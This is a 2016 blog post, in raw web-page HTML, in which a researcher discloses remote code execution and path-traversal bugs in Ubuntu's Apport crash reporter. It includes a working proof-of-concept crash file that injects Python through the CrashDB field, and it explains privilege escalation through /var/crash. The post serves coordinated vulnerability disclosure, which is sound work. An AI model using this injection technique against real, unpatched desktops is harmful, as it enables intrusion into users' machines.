<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>Reliably compromising Ubuntu desktops by attacking the crash reporter | Donncha O&#039;Cearbhaill</title>
<link rel="profile" href="https://gmpg.org/xfn/11" />
<link rel="pingback" href="https://donncha.is/xmlrpc.php" />
<!--[if lt IE 9]>
<script src="https://donncha.is/wp-content/themes/twentytwelve-custom/js/html5.js" type="text/javascript"></script>
<![endif]-->
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Donncha O&#039;Cearbhaill &raquo; Feed" href="https://donncha.is/feed/" />
<link rel="alternate" type="application/rss+xml" title="Donncha O&#039;Cearbhaill &raquo; Comments Feed" href="https://donncha.is/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Donncha O&#039;Cearbhaill &raquo; Reliably compromising Ubuntu desktops by attacking the crash reporter Comments Feed" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/feed/" />
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/donncha.is\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.21"}};
			!function(t,a,e){var r,n,i,o=a.createElement("canvas"),l=o.getContext&&o.getContext("2d");function c(t){var e=a.createElement("script");e.src=t,e.defer=e.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(e)}for(i=Array("flag","emoji4"),e.supports={everything:!0,everythingExceptFlag:!0},n=0;n<i.length;n++)e.supports[i[n]]=function(t){var e,a=String.fromCharCode;if(!l||!l.fillText)return!1;switch(l.clearRect(0,0,o.width,o.height),l.textBaseline="top",l.font="600 32px Arial",t){case"flag":return(l.fillText(a(55356,56826,55356,56819),0,0),o.toDataURL().length<3e3)?!1:(l.clearRect(0,0,o.width,o.height),l.fillText(a(55356,57331,65039,8205,55356,57096),0,0),e=o.toDataURL(),l.clearRect(0,0,o.width,o.height),l.fillText(a(55356,57331,55356,57096),0,0),e!==o.toDataURL());case"emoji4":return l.fillText(a(55357,56425,55356,57341,8205,55357,56507),0,0),e=o.toDataURL(),l.clearRect(0,0,o.width,o.height),l.fillText(a(55357,56425,55356,57341,55357,56507),0,0),e!==o.toDataURL()}return!1}(i[n]),e.supports.everything=e.supports.everything&&e.supports[i[n]],"flag"!==i[n]&&(e.supports.everythingExceptFlag=e.supports.everythingExceptFlag&&e.supports[i[n]]);e.supports.everythingExceptFlag=e.supports.everythingExceptFlag&&!e.supports.flag,e.DOMReady=!1,e.readyCallback=function(){e.DOMReady=!0},e.supports.everything||(r=function(){e.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",r,!1),t.addEventListener("load",r,!1)):(t.attachEvent("onload",r),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&e.readyCallback()})),(r=e.source||{}).concatemoji?c(r.concatemoji):r.wpemoji&&r.twemoji&&(c(r.twemoji),c(r.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='twentytwelve-fonts-css' href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-style-css' href='https://donncha.is/wp-content/themes/twentytwelve-custom/style.css?ver=4.7.21' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='https://donncha.is/wp-content/themes/twentytwelve-custom/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='slb_core-css' href='https://donncha.is/wp-content/plugins/simple-lightbox/client/css/app.css?ver=2.6.0' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://donncha.is/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css' href='https://donncha.is/wp-content/plugins/jetpack/css/jetpack.css?ver=5.5.3' type='text/css' media='all' />
<script type='text/javascript' src='https://donncha.is/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://donncha.is/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<link rel='https://api.w.org/' href='https://donncha.is/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://donncha.is/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://donncha.is/wp-includes/wlwmanifest.xml" />
<link rel='prev' title='Problems using an OpenPGP smartcard for SSH with gpg-agent' href='https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/' />
<meta name="generator" content="WordPress 4.7.21" />
<link rel="canonical" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/" />
<link rel='shortlink' href='https://wp.me/p3xaG9-2e' />
<link rel="alternate" type="application/json+oembed" href="https://donncha.is/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdonncha.is%2F2016%2F12%2Fcompromising-ubuntu-desktop%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://donncha.is/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdonncha.is%2F2016%2F12%2Fcompromising-ubuntu-desktop%2F&#038;format=xml" />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="Reliably compromising Ubuntu desktops by attacking the crash reporter" />
<meta property="og:url" content="https://donncha.is/2016/12/compromising-ubuntu-desktop/" />
<meta property="og:description" content="In this post I&#8217;ll describe how I found a remote code execution bug in Ubuntu Desktop which affects all default installations &gt;= 12.10 (Quantal). The bug allows for reliable code injection â€¦" />
<meta property="article:published_time" content="2016-12-14T22:00:32+00:00" />
<meta property="article:modified_time" content="2016-12-15T21:40:57+00:00" />
<meta property="og:site_name" content="Donncha O&#039;Cearbhaill" />
<meta property="og:image" content="https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt.png" />
<meta property="og:image:width" content="726" />
<meta property="og:image:height" content="287" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Reliably compromising Ubuntu desktops by attacking the crash reporter" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:creator" content="@DonnchaC" />
</head>
<body class="post-template-default single single-post postid-138 single-format-standard custom-font-enabled single-author">
<div id="page" class="hfeed site">
<header id="masthead" class="site-header" role="banner">
<hgroup>
<h1 class="site-title"><a href="https://donncha.is/" title="Donncha O&#039;Cearbhaill" rel="home">Donncha O&#039;Cearbhaill</a></h1>
<ul id="media-links">
<li><a title="LinkedIn" href="https://www.linkedin.com/in/donnchaocearbhaill"><img src="https://donncha.is/wp-content/themes/twentytwelve-custom/icons/linkedin.png" alt="LinkedIn" /></a></li>
<li><a title="Twitter" href="https://www.twitter.com/DonnchaC"><img src="https://donncha.is/wp-content/themes/twentytwelve-custom/icons/twitter.png" alt="Twitter" /></a></li>
<li><a title="Github" href="https://www.github.com/DonnchaC"><img src="https://donncha.is/wp-content/themes/twentytwelve-custom/icons/github.png" alt="Github" /></a></li>
</ul>
<h2 class="site-description"></h2>
</hgroup>
<nav id="site-navigation" class="main-navigation" role="navigation">
<h3 class="menu-toggle">Menu</h3>
<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
<div class="nav-menu"><ul>
<li><a href="https://donncha.is/">Home</a></li><li class="page_item page-item-18"><a href="https://donncha.is/about/">About</a></li>
<li class="page_item page-item-2"><a href="https://donncha.is/contact/">Contact</a></li>
<li class="page_item page-item-181"><a href="https://donncha.is/vulnerabilities/">Vulnerabilities</a></li>
</ul></div>
</nav>
</header>
<div id="main" class="wrapper">
<div id="primary" class="site-content">
<div id="content" role="main">
<article id="post-138" class="post-138 post type-post status-publish format-standard hentry category-misc">
<header class="entry-header">
<h1 class="entry-title">Reliably compromising Ubuntu desktops by attacking the crash reporter</h1>
<div class="comments-link">
<a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comments">30 Replies</a> </div>
</header>
<div class="entry-content">
<p>In this post I&#8217;ll describe how I found a remote code execution bug in Ubuntu Desktop which affects all default installations <code>&gt;= 12.10</code> (Quantal). The bug allows for reliable code injection when a user simply opens a malicious file. The following video demonstrates the exploit opening the Gnome calculator. The executed payload also replaces the exploit file with a decoy zip file to cover its tracks.</p>
<p>The full source code for this exploit is available on <a href="https://github.com/DonnchaC/ubuntu-apport-exploitation">Github</a>.</p>
<p><iframe src="https://player.vimeo.com/video/194867494" width="640" height="480" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></p>
<p>This research was inspired by Chris Evan&#8217;s great work on <a href="https://scarybeastsecurity.blogspot.com/2016/11/0day-exploit-compromising-linux-desktop.html" target="_blank">exploiting client-side file format parsing bugs in the gstreamer media library</a> on Ubuntu. We will look for other default file handlers on Ubuntu which may be vulnerable to exploitation. I&#8217;m not a binary exploitation guru like Chris so instead we&#8217;ll try find bugs which are exploitable without memory corruption.</p>
<h2>File and URL handler configuration on Linux desktops</h2>
<p>Desktop environments such as GNOME or KDE ship with a list of known file types and default applications. When a user opens a file, the desktop environment first determines the file format and then launches the corresponding application. Ubuntu stores a set of .desktop files for its default applications in the<em>Â <code>/usr/share/applications/</code></em>Â directory. We want to see which default applications are responsible for a particular file type (MimeType) and run with the filename passed as an argument.</p>
<script src="https://gist.github.com/6cabb0abe01efc1e1db757da1ceca871.js"></script><noscript><pre><code class="language- ">$ grep -l 'MimeType' * | xargs grep 'Exec.*\%'
apport-gtk.desktop:Exec=/usr/share/apport/apport-gtk -c %f
apturl.desktop:Exec=apturl %u
display-im6.desktop:Exec=/usr/bin/display-im6 %f
display-im6.q16.desktop:Exec=/usr/lib/x86_64-linux-gnu/ImageMagick-6.8.9/bin-Q16/display %f
eog.desktop:Exec=eog %U
evince.desktop:Exec=evince %U
fcitx-skin-installer.desktop:Exec=fcitx-skin-installer %U
firefox.desktop:Exec=firefox %u
gnome-disk-image-mounter.desktop:Exec=gnome-disk-image-mounter %U
gnome-disk-image-writer.desktop:Exec=gnome-disks --restore-disk-image %U
gnome-software-local-file.desktop:Exec=gnome-software --local-filename=%f
libreoffice-calc.desktop:Exec=libreoffice --calc %U
libreoffice-draw.desktop:Exec=libreoffice --draw %U
libreoffice-impress.desktop:Exec=libreoffice --impress %U
libreoffice-math.desktop:Exec=libreoffice --math %U
libreoffice-startcenter.desktop:Exec=libreoffice %U
libreoffice-writer.desktop:Exec=libreoffice --writer %U
libreoffice-xsltfilter.desktop:Exec=libreoffice %U
mount-archive.desktop:Exec=/usr/lib/gvfs/gvfsd-archive file=%u
nautilus-autorun-software.desktop:Exec=nautilus-autorun-software %u
nautilus-folder-handler.desktop:Exec=nautilus --new-window %U
org.gnome.FileRoller.desktop:Exec=file-roller %U
org.gnome.font-viewer.desktop:Exec=gnome-font-viewer %u
org.gnome.gedit.desktop:Exec=gedit %U
org.gnome.Nautilus.desktop:Exec=nautilus --new-window %U
org.gnome.Software.desktop:Exec=gnome-software %U
org.gnome.Totem.desktop:Exec=totem %U
rhythmbox.desktop:Exec=rhythmbox %U
rhythmbox-device.desktop:Exec=rhythmbox-client --select-source %U
shotwell.desktop:Exec=shotwell %U
shotwell-viewer.desktop:Exec=shotwell %f
thunderbird.desktop:Exec=thunderbird %u
transmission-gtk.desktop:Exec=transmission-gtk %U
vim.desktop:Exec=vim %F
webbrowser-app.desktop:Exec=webbrowser-app %u
yelp.desktop:Exec=yelp %u</code></pre></noscript>
<p>Many of the listed applications are frequently audited software such as image viewers, media players, LibreOffice and Firefox. Instead we are going to look for less commonly researched software which can also be spawned by a default file handler. Apport, Ubuntu&#8217;s default crash handler and crash reporting software is first on our list. Let&#8217;s see what file types it will handle:</p>
<script src="https://gist.github.com/70eb35cf941b83972dcd848292010d8f.js"></script><noscript><pre><code class="language-desktop desktop">[Desktop Entry]
Name=Report a problem...
Comment=Report a malfunction to the developers
Exec=/usr/share/apport/apport-gtk -c %f
Icon=apport
Terminal=false
Type=Application
MimeType=text/x-apport;
Categories=GNOME;GTK;Utility;
NoDisplay=true
StartupNotify=true
X-Ubuntu-Gettext-Domain=apport</code></pre></noscript>
<p>Great, GNOME should open all files matching the mime-type <code>text/x-apport</code> with the <code>apport-gtk</code> tool. Ubuntu determines mime-types based on Mime descriptions in the <code>/usr/share/mime/</code> directory. Typically the file extension will be used to determine the file type, however the desktop environment can fallback to matching a pattern (a set of magic bytes) in the file if the file extension is unrecognized.</p>
<script src="https://gist.github.com/d89e69cb9d971c5669a4a21dc193a1b7.js"></script><noscript><pre><code class="language-xml xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;mime-info xmlns='http://www.freedesktop.org/standards/shared-mime-info'&gt;
    &lt;mime-type type=&quot;text/x-apport&quot;&gt;
        &lt;sub-class-of type=&quot;text/plain&quot;/&gt;
        &lt;comment&gt;Apport crash file&lt;/comment&gt;
        &lt;glob pattern=&quot;*.crash&quot;/&gt;
                &lt;magic priority=&quot;20&quot;&gt;
                  &lt;match value=&quot;ProblemType: &quot; type=&quot;string&quot; offset=&quot;0&quot;/&gt;
                &lt;/magic&gt;
    &lt;/mime-type&gt;
&lt;/mime-info&gt;</code></pre></noscript>
<p>In the case of Apport both a file extension <code>.crash</code> and a magic byte sequence are specified. The desktop environment will try to match the file extension first before comparing magic byte. As the Apport crash file descriptor has a byte pattern we can potentially create an exploit file without a strange .crash extension.</p>
<p>A quick test shows that Ubuntu will open any unknown file with <em>apport-gtk</em> if it begins with &#8220;<code>ProblemType: </code>&#8220;:</p>
<p><a href="https://donncha.is/wp-content/uploads/2016/12/apport-file-handler.png" data-slb-active="1" data-slb-asset="2029817036" data-slb-internal="0" data-slb-group="138"><img class="alignleft size-large wp-image-139" src="https://donncha.is/wp-content/uploads/2016/12/apport-file-handler-1024x555.png" alt="Crash file opened automatically by apport-gtk" width="625" height="338" srcset="https://donncha.is/wp-content/uploads/2016/12/apport-file-handler-1024x555.png 1024w, https://donncha.is/wp-content/uploads/2016/12/apport-file-handler-300x162.png 300w, https://donncha.is/wp-content/uploads/2016/12/apport-file-handler-624x338.png 624w" sizes="(max-width: 625px) 100vw, 625px" /></a></p>
<p>Apport looks like a good candidate! It&#8217;s installed by default and it&#8217;s registered as a default file handler. Let&#8217;s try and understand what Apport is meant to do.</p>
<h2>Auditing Apport</h2>
<p>Ubuntu has shipped the Apport crash handling software with all of its recent Desktop releases. It contains a handful of different components which work together to capture crash reports, display them to user, and upload those reports to the Ubuntu issue tracker. An overview of these components is provided on the <a href="https://wiki.ubuntu.com/Apport#How_does_it_work_internally" target="_blank">Ubuntu wiki</a>.</p>
<p><code>/usr/share/apport/apport</code> is called when the system detects an application crash. To keep the performance impact to a minimum Apport records a minimal set of information at crash time such as the executable path and a core dump. This minimal crash report is written to <code>/var/crash/[executable_path].[uid].crash</code>.</p>
<p>The <code>update-notifier</code> daemon in Gnome keeps an <code>inotify</code> watch on the <code>/var/crash</code> directory. Whenever there is something new, it calls <code>/usr/share/apport/apport-checkreports</code>. If new reports are found <code>apport-checkreports</code> calls <code>/usr/share/apport/apport-gtk</code> to the display the crash report GUI to the user. <code>apport-gtk</code> is also the application called when <code>.crash</code> files are opened on the desktop environment.</p>
<p>Apport-GTK parses the crash files and displays a minimal crash report prompt to the user. The Apport prompt will be familiar sight to anyone who has used Ubuntu desktop.</p>
<p><a href="https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt.png" data-slb-active="1" data-slb-asset="832215359" data-slb-internal="0" data-slb-group="138"><img class="alignleft size-full wp-image-140" src="https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt.png" alt="Typical Apport prompt" width="726" height="287" srcset="https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt.png 726w, https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt-300x118.png 300w, https://donncha.is/wp-content/uploads/2016/12/basic-apport-prompt-624x246.png 624w" sizes="(max-width: 726px) 100vw, 726px" /></a></p>
<h2>Apport crash report format</h2>
<p>The Apport software reads and writes crash reports in its custom crash report format. This plaintext format is partially <a href="https://wiki.ubuntu.com/Apport?action=AttachFile&amp;do=view&amp;target=data-format.pdf" target="_blank">described on the ApportÂ wiki page</a>.</p>
<p>There are many potential fields which can be used to store information about the crash and about the current system state. The minimal file created at crash time just contains essential entries such as the <code>ProblemType</code>, <code>ExecutablePath</code> and the <code>CoreDump</code>.</p>
<p>When opened <code>apport-gtk</code> collects some more basic information to display a helpful interface to the user. Package information is retrieved based on the executable path and this is used to provide a more friendly application name and icon in the prompt.</p>
<h2>Python code injection in the crash file</h2>
<p>Apport can submit crash reports to different Ubuntu Launchpad projects depending on which software crashed. Package specific hook scripts (loaded from <code>/usr/share/apport/package-hooks/</code>) can customize the contents and destination of the crash report. The destination project can also be specified with a <code>CrashDB</code> field in the crash report file.</p>
<p>The CrashDB configurations are stored in the <code>/etc/apport/crashdb.conf.d</code> directory. A <code>CrashDB</code> field can be used to load a specific config file from this directory.</p>
<script src="https://gist.github.com/b56e21b624d52f9daf4c5c1fcfcdb7c7.js"></script><noscript><pre><code class="language-python python"># specification?
if self.report['CrashDB'].lstrip().startswith('{'):
    try:
        spec = eval(self.report['CrashDB'], {})
        assert isinstance(spec, dict)
        assert 'impl' in spec
    except:
        self.report['UnreportableReason'] = 'A package hook defines an invalid crash database definition:\n%s' % self.report['CrashDB']
        return False
    try:
        self.crashdb = apport.crashdb.load_crashdb(None, spec)
    except (ImportError, KeyError):
        self.report['UnreportableReason'] = 'A package hook wants to send this report to the crash database &quot;%s&quot; which does not exist.' % self.report['CrashDB']

else:
    # DB name
    try:
        self.crashdb = apport.crashdb.get_crashdb(None, self.report['CrashDB'])
    except (ImportError, KeyError):
        self.report['UnreportableReason'] = 'A package hook wants to send this report to the crash database &quot;%s&quot; which does not exist.' % self.report['CrashDB']
        return False</code></pre></noscript>
<p>Problematically there is also code which loads the CrashDB configuration directly from the <code>CrashDB</code> field and not from a local file. The code first checks if the CrashDB field starts with <code>{</code>Â indicating the start of a Python dictionary. If found, Apport will call Python&#8217;s builtin <code>eval()</code> method with the value of the <code>CrashDB</code> field. <code>eval()</code> executes the passed data as a Python expression which leads to straight forward and reliable Python code execution.</p>
<p>The vulnerable code was introduce on 2012-08-22 in Apport <a target="_blank" href="https://bazaar.launchpad.net/~apport-hackers/apport/trunk/files/2464">revision 2464</a>. This code was first included in release <code>2.6.1</code>. All Ubuntu Desktop versions <em>12.10 (Quantal)</em> and later include this vulnerable code by default.</p>
<h2>Exploiting the code injection bug</h2>
<p>The following is a minimal crash report file which exploits the CrashDB vulnerability in order to gain arbitrary code execution and open the Gnome calculator:</p>
<script src="https://gist.github.com/fabec710cf90802579c126e043e970c7.js"></script><noscript><pre><code class="language- ">ProblemType: Bug
ExecutablePath: /usr/bin/file-roller
Stacktrace:
 None
CrashDB: {'impl': 'memory', 'crash_config': exec(&quot;&quot;&quot;
 import subprocess
 payload_cmd = &quot;pkill -9 apport; gnome-calculator&quot;
 subprocess.Popen(payload_cmd, shell=True)
 &quot;&quot;&quot;, {}) }</code></pre></noscript>
<p>This code can be saved with the .crash extension, or with any extension that is not registered on Ubuntu.</p>
<p>Apport typically reads a subset of the fields in the crash file in order to prepare the GUI which prompts the user to submit a bug report. The CrashDB field is not parsed and executed until after the user agrees to submit the bug report. However when <code>ProblemType: Bug</code> is set in the crash file, Apport-GTK will switch to the streamlined <code>Bug</code> GUI which causes the <code>CrashDB</code> field to be parsed and executed without any further user interaction.</p>
<p>Apport will spend some time trying to gather information about the crash process if the report does not already contain a <code>Stracktrace</code> field. This delays the execution of the <code>CrashDB</code> field. An empty <code>Stracktrace</code> field in exploit file causes Apport to skip this slow code path.</p>
<p>Apport ships with a number of CrashDB implementations. I have selected the <code>memory</code> implementation as it does not upload crash reports to public bug tracking service.</p>
<p><iframe src="https://player.vimeo.com/video/195677809" width="640" height="480" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></p>
<h2>Path traversal when loading hook scripts</h2>
<p>Packages on Ubuntu can install Apport hook scripts to the <code>/usr/share/apport/package-hooks</code> directory. These Python hook scripts are loaded based on the distribution package name. They allow package maintainers to collect useful package specific crash information from users&#8217; computers. However the <code>Package</code> field from the crash report file is used without sanitization when building a path to the package hook files.</p>
<script src="https://gist.github.com/7f1f71ecae95cb1fc97656eae5a99ef3.js"></script><noscript><pre><code class="language- "># binary package hook
if package:
    for hook_dir in hook_dirs:
        if _run_hook(self, ui, os.path.join(hook_dir, package + '.py')):
            return True
</code></pre><pre><code class="language- ">with open(hook) as fd:
    exec(compile(fd.read(), hook, 'exec'), symb)</code></pre></noscript>
<p>This code allows for a path traversal attack and the execution of arbitrary Python scripts outside the system <code>hook_dirs</code> (<code>/usr/share/apport/general-hooks/</code> or <code>/usr/share/apport/package-hooks/</code>). The <code>_run_hook</code> function simply executes the contents of a provided hook file as Python code. An attacker could serve plant a malicious <code>.py</code> file and a crash file in the users Download directory to get code execution. This scenario is made much easier by Chromium which automatically downloads files without prompting.</p>
<p>The path traversal vulnerability was introduced on 2007-01-24 in Apport 0.44. This version was first released with Ubuntu 7.04 (Feisty).</p>
<h2>Using the CrashDB or hook injection bugs for privilege escalation (with user interaction)</h2>
<p>All crash files owned by a uid &lt; 500 are considered system crash files. When opening system crash files <code>apport-crashreports</code> will use PolicyKit to prompt the desktop user for root privileges. The prompt is a generic &#8220;System program problem detected&#8221; message which does not provide any information to the user about the crash.</p>
<p>If a crash file exploiting either of these bugs is placed in <code>/var/crash</code> by a user with uid &lt; 500, and the user accepts the prompt, then code execution can be gained as root. While user interaction is required, people who have used Ubuntu for any period of time will be used to seeing these privilege prompts after random crashes.</p>
<p><a href="https://donncha.is/wp-content/uploads/2016/12/apport-privilaged-prompt.png" data-slb-active="1" data-slb-asset="1083263339" data-slb-internal="0" data-slb-group="138"><img class="alignleft size-full wp-image-141" src="https://donncha.is/wp-content/uploads/2016/12/apport-privilaged-prompt.png" alt="Apport system application crash prompt" width="679" height="365" srcset="https://donncha.is/wp-content/uploads/2016/12/apport-privilaged-prompt.png 679w, https://donncha.is/wp-content/uploads/2016/12/apport-privilaged-prompt-300x161.png 300w, https://donncha.is/wp-content/uploads/2016/12/apport-privilaged-prompt-624x335.png 624w" sizes="(max-width: 679px) 100vw, 679px" /></a></p>
<p>A bug like this allows a low-privileged application to cross privilege boundaries. For example an SQL injection bug could be used to write a crash file to the world-writable <em>/var/crash</em> directory by using the <code>"INTO OUTFILE"</code> clause. This crash file would then be automatically executed when a desktop user logs in.</p>
<p><iframe src="https://player.vimeo.com/video/194586375" width="640" height="480" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></p>
<h2>Conclusion</h2>
<p>Both of these issues were reported to the Apport maintainers and a fix was released on 2016-12-14. The CrashDB code injection issue can be tracked with CVE-2016-9949 and the path traversal bug with CVE-2016-9950. An additional problem where arbitrary commands can be called with the &#8220;Relaunch&#8221; action is tracked by CVE-2016-9951. I&#8217;d like to thank Martin Pitt and the Ubuntu security team for getting <a href="https://bugs.launchpad.net/apport/+bug/1648806" target="_blank">a fix</a> released so quickly. They have been a pleasure to work with.</p>
<p>I would encourage all security researchers to audit free and open source software if they have time on their hands. Projects such as Tor, Tails, Debian and Ubuntu all need more eyes for audits which can improve the safety of the internet for everyone. There are lots of bugs out there which don&#8217;t need hardcore memory corruption exploitation skills. Logic bugs can be much more reliable than any ROP chain.</p>
<p>The computer security industry has a serious conflict of interest right now. There is major financial motivation for researchers to find and disclose vulnerability to exploit brokers. Many of the brokers are in the business of keeping problems unfixed. Code execution bugs are valuable. As a data point, I received an offer of more than 10,000 USD from an exploit vendor for these Apport bugs. These financial motivators are only increasing as software gets more secure and bugs become more difficult to find.</p>
<p>To improve security for everyone we need to find sustainable ways to incentivize researchers to find and disclose issues and to get bugs fixed. We can&#8217;t and we shouldn&#8217;t rely on researchers giving away their work for free to for-profit vendors. We will not get security like that.</p>
<p>Microsoft and Google have shown a good example with their vulnerability reward programs. The <a href="https://internetbugbounty.org/" target="_blank">Internet Bug Bounty</a> is also doing great work and helping to support research on critical internet software. I hope that they can continue the program and expand their scope in the future. I hope we can cooperatively build a shared and secure internet together.</p>
<h2>Timeline</h2>
<p>2016-12-09: Apport maintainer contacted<br />
2016-12-10: Response and private bug ticket opened<br />
2016-12-14: Fixed Apport packages released.</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-138" class="share-twitter sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-google-plus-1"><a rel="nofollow" data-shared="sharing-google-138" class="share-google-plus-1 sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/?share=google-plus-1" target="_blank" title="Click to share on Google+"><span>Google</span></a></li><li class="share-linkedin"><a rel="nofollow" data-shared="sharing-linkedin-138" class="share-linkedin sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow" data-shared="" class="share-reddit sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-email"><a rel="nofollow" data-shared="" class="share-email sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/?share=email" target="_blank" title="Click to email this to a friend"><span>Email</span></a></li><li class="share-print"><a rel="nofollow" data-shared="" class="share-print sd-button share-icon" href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#print" target="_blank" title="Click to print"><span>Print</span></a></li><li class="share-end"></li></ul></div></div></div> </div>
<footer class="entry-meta">
This entry was posted in <a href="https://donncha.is/category/misc/" rel="category tag">Misc</a> on <a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/" title="10:00 pm" rel="bookmark"><time class="entry-date" datetime="2016-12-14T22:00:32+00:00">December 14, 2016</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="https://donncha.is/author/donncha/" title="View all posts by Donncha" rel="author">Donncha</a></span></span>. </footer>
</article>
<nav class="nav-single">
<h3 class="assistive-text">Post navigation</h3>
<span class="nav-previous"><a href="https://donncha.is/2014/07/problems-using-an-openpgp-smartcard-for-ssh-with-gpg-agent/" rel="prev"><span class="meta-nav">&larr;</span> Problems using an OpenPGP smartcard for SSH with gpg-agent</a></span>
<span class="nav-next"></span>
</nav>
<div id="comments" class="comments-area">
<h2 class="comments-title">
30 thoughts on &ldquo;<span>Reliably compromising Ubuntu desktops by attacking the crash reporter</span>&rdquo; </h2>
<ol class="commentlist">
<li class="pingback even thread-even depth-1" id="comment-138806">
<p>Pingback: <a href='https://2ruth.net/fedora-and-ubuntu-0-days-show-that-hacking-desktop-linux-is-now-a-thing/' rel='external nofollow' class='url'>Fedora and Ubuntu 0-days show that hacking desktop Linux is now a thing | |</a> </p>
</li>
<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-138817">
<article id="comment-138817" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/10468ad8d146df7dc85e4f8c51ef542e?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/10468ad8d146df7dc85e4f8c51ef542e?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">..... </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138817"><time datetime="2016-12-16T07:06:52+00:00">December 16, 2016 at 7:06 am</time></a> </header>
<section class="comment-content comment">
<p>You should have taken the money, stupid.</p>
</section>
<div class="reply">
<a rel='nofollow' class='comment-reply-link' href='https://donncha.is/2016/12/compromising-ubuntu-desktop/?replytocom=138817#respond' onclick='return addComment.moveForm( "comment-138817", "138817", "respond", "138" )' aria-label='Reply to .....'>Reply</a> <span>&darr;</span> </div>
</article>
</li>
<li class="comment even thread-even depth-1" id="li-comment-138832">
<article id="comment-138832" class="comment">
<header class="comment-meta comment-author vcard">
<img alt='' src='https://secure.gravatar.com/avatar/c5605bbabf2ce3c685379bec0c40e02e?s=44&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c5605bbabf2ce3c685379bec0c40e02e?s=88&amp;d=mm&amp;r=g 2x' class='avatar avatar-44 photo' height='44' width='44' /><cite class="fn">mohamed </cite><a href="https://donncha.is/2016/12/compromising-ubuntu-desktop/#comment-138832"><time datetime="2016-12-16T13:00:19+00:00">December 16, 2016 at 1:00 pm</time></a> </header>
<section class="comment-content comment">
